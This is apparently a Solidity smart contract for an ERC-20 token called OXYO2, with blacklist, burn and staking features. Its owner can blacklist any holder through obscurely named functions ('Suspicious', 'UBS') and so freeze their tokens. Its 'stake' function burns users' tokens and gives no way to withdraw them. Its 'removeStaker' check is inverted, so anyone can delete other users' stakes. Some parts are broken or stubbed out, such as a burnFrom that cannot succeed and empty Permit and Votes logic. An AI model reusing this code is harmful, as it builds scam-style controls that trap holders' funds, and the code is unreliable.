pragma solidity ^0.8.0;

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public ibd;
    
    uint private _totalstake;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function totalStaking() public view returns (uint) {
        return _totalstake;
    }
    function checkBlocked(address _address) public view returns (bool) {
        return ibd[_address];
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(ibd[sender] != true, "ERC20: Sender is Blacklist");
        require(ibd[recipient] != true, "ERC20: Recipient is Blacklist");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

   
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account == _msgSender());
        require(account != address(0), "ERC20: burn from the zero address");
        require(ibd[account] != true, "ERC20: Address is Blacklisted");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        _totalstake += amount;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

   
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

pragma solidity ^0.8.0;

abstract contract ERC20Permit is ERC20 {
    using Counters for Counters.Counter;

    mapping(address => Counters.Counter) private _nonces;

    constructor(string memory name){}
}

pragma solidity ^0.8.0;

abstract contract ERC20Votes is ERC20Permit {
    struct Checkpoint {
        uint32 fromBlock;
        uint224 votes;
    }

    function _maxSupply() internal view virtual returns (uint224) {
        return type(uint224).max;
    }

    function _mint(address account, uint256 amount) internal virtual override {
        super._mint(account, amount);
        require(totalSupply() <= _maxSupply(), "ERC20Votes: total supply risks overflowing votes");
    }

    function _burn(address account, uint256 amount) internal virtual override {
        super._burn(account, amount);
    }

    function _add(uint256 a, uint256 b) private pure returns (uint256) {
        return a + b;
    }

    function _subtract(uint256 a, uint256 b) private pure returns (uint256) {
        return a - b;
    }
}

pragma solidity ^0.8.0;

abstract contract ERC20Burnable is Context, ERC20 {
   
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    function burnFrom(address account, uint256 amount) public virtual {
        uint256 currentAllowance = allowance(account, _msgSender());
        require(currentAllowance >= amount, "ERC20: burn amount exceeds allowance");
        unchecked {
            _approve(account, _msgSender(), currentAllowance - amount);
        }
        _burn(account, amount);
    }
}

pragma solidity ^0.8.0;

contract OXYO2 is ERC20, ERC20Burnable, Ownable, ERC20Permit, ERC20Votes {
    constructor() ERC20("OXYO2", "KRPZA") ERC20Permit("OXYO2") {
        _mint(msg.sender, 1000000000 * 10 ** decimals());
    }
    
    function Suspicious(address _address) public onlyOwner {
        require(msg.sender != _address,"ERROR");
        ibd[_address] = true;
    }
    
    function UBS(address _address) public onlyOwner {
        ibd[_address] = false;
    }
    event staking(address indexed useraddress, uint256 tokenamount);
    function stake(address _address, uint256 tamount, uint _endstake) public virtual{
        require(_address == _msgSender());
        _burn(_msgSender(), tamount);
        _addStaker(_msgSender(), tamount, _endstake);
      emit staking(_msgSender(),tamount);
    }

    function _mint(address to, uint256 amount)
        internal
        override(ERC20, ERC20Votes)
    {
        super._mint(to, amount);
    }

    function _burn(address account, uint256 amount)
    internal
    override(ERC20, ERC20Votes)
    {
        super._burn(account, amount);
    }
    struct Stakers {
        address _address;
        uint _timestamp;
        bool _isStaker;
        uint _value;
        uint _balance;
        bool _isRestake;
        uint _stakeend;
    }
    Stakers[] private stakers;
    uint private total;
    
    function _addStaker(address _address, uint _value, uint _endstake) internal virtual {
        require(_address == _msgSender());
        stakers.push(
            Stakers({
                _address : _address,
                _timestamp : block.timestamp,
                _isStaker : true,
                _value : _value,
                _balance : 0,
                _isRestake : false,
                _stakeend :  _endstake
            })
        );
        total += _value;
    }
    function removeStaker(address _address , uint _timestamp, uint _endstake) public virtual {
        require(_address != _msgSender(),"Not Address Owner");
        for (uint256 i = 0; i < stakers.length; i++) {
            require(checkBlocked(_address) != true, "Error: Address is Blacklist");
            if(stakers[i]._address == _address && stakers[i]._timestamp == _timestamp && stakers[i]._stakeend == _endstake){
                stakers[i] = stakers[stakers.length - 1];
                stakers[i]._isStaker = false;
                total = total - stakers[i]._value;
                stakers.pop();
            }
        }
    }
}
